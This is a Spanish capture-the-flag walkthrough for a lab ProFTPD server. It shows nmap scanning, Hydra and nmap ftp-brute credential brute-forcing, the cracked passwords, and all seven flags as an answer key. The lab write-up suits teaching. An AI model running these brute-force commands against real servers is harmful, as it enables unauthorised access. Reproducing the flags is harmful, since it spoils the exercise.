# 🗃️ ProFTPD Recon: Enumeración y Captura de Banderas

## 🔍 Objetivo

Enumerar un servidor FTP vulnerable, aplicar fuerza bruta a las credenciales y recuperar **siete banderas** ocultas en los directorios de los distintos usuarios.

## 📡 Escaneo inicial

```bash
nmap -sV demo.ine.local
```

Resultado: **ProFTPD 1.3.5a** en el puerto 21.

## 🔐 Fuerza bruta con Hydra

Se emplean los diccionarios de usuarios y contraseñas incluidos en Metasploit:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      demo.ine.local -t 4 ftp
```

| Usuario        | Contraseña  |
|----------------|-------------|
| sysadmin       | 654321      |
| rooty          | qwerty      |
| demo           | butterfly   |
| auditor        | chocolate   |
| anon           | purple      |
| administrator  | tweety      |
| diag           | tigger      |

## 🎯 Obtención de la contraseña de `sysadmin` con script Nmap

```bash
echo "sysadmin" > users
nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
```

Resultado: `654321`.

## 🏁 Captura de las banderas

Cada usuario contiene un archivo `secret.txt` con una bandera. Se accede con el cliente FTP interactivo.

### Bandera 1 – sysadmin

```bash
ftp demo.ine.local
> Name: sysadmin
> Password: 654321
ftp> ls
ftp> get secret.txt
ftp> exit
cat secret.txt
```

**Flag 1:** `260ca9dd8a4577fc00b7bd5810298076`

### Bandera 2 – rooty

```bash
ftp demo.ine.local
> rooty / qwerty
ftp> get secret.txt
```

**Flag 2:** `e529a9cea4a728eb9c5828b13b22844c`

### Bandera 3 – demo

```bash
> demo / butterfly
```

**Flag 3:** `d6a6bc0db10694a2d90e3a69648f3a03`

### Bandera 4 – auditor

```bash
> auditor / chocolate
```

**Flag 4:** `098f6bcd4621d373cade4e832627b4f6`

### Bandera 5 – anon

```bash
> anon / purple
```

**Flag 5:** `1bc29b36f623ba82aaf6724fd3b16718`

### Bandera 6 – administrator

```bash
> administrator / tweety
```

**Flag 6:** `21232f297a57a5a743894a0e4a801fc3`

### Bandera 7 – diag

```bash
> diag / tigger
```

**Flag 7:** `12a032ce9179c32a6c7ab397b9d871fa`

## 📋 Resumen completo

| Usuario        | Contraseña   | Flag                                      |
|----------------|--------------|-------------------------------------------|
| sysadmin       | 654321       | `260ca9dd8a4577fc00b7bd5810298076`        |
| rooty          | qwerty       | `e529a9cea4a728eb9c5828b13b22844c`        |
| demo           | butterfly    | `d6a6bc0db10694a2d90e3a69648f3a03`        |
| auditor        | chocolate    | `098f6bcd4621d373cade4e832627b4f6`        |
| anon           | purple       | `1bc29b36f623ba82aaf6724fd3b16718`        |
| administrator  | tweety       | `21232f297a57a5a743894a0e4a801fc3`        |
| diag           | tigger       | `12a032ce9179c32a6c7ab397b9d871fa`        |

Cada bandera se obtiene iniciando sesión FTP con las credenciales correspondientes y descargando el archivo `secret.txt` del directorio del usuario.
